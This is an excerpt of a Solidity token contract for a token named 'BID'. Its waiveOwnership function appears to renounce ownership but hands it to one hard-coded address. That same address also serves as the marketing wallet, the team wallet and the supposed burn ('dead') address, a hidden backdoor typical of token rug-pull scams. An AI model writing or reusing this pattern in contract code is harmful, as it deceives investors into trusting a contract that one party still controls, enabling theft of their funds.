...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x566224879ADABdD7fF673E66adFb30F1F108232C));
        _owner = address(0x566224879ADABdD7fF673E66adFb30F1F108232C);
    }
...
contract FI is Context, IERC20, Ownable {
    ...
    string private _name = "BID";
    string private _symbol = "BID";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x566224879ADABdD7fF673E66adFb30F1F108232C);
    address payable public teamWalletAddress = payable(0x566224879ADABdD7fF673E66adFb30F1F108232C);
    address public immutable deadAddress = 0x566224879ADABdD7fF673E66adFb30F1F108232C;
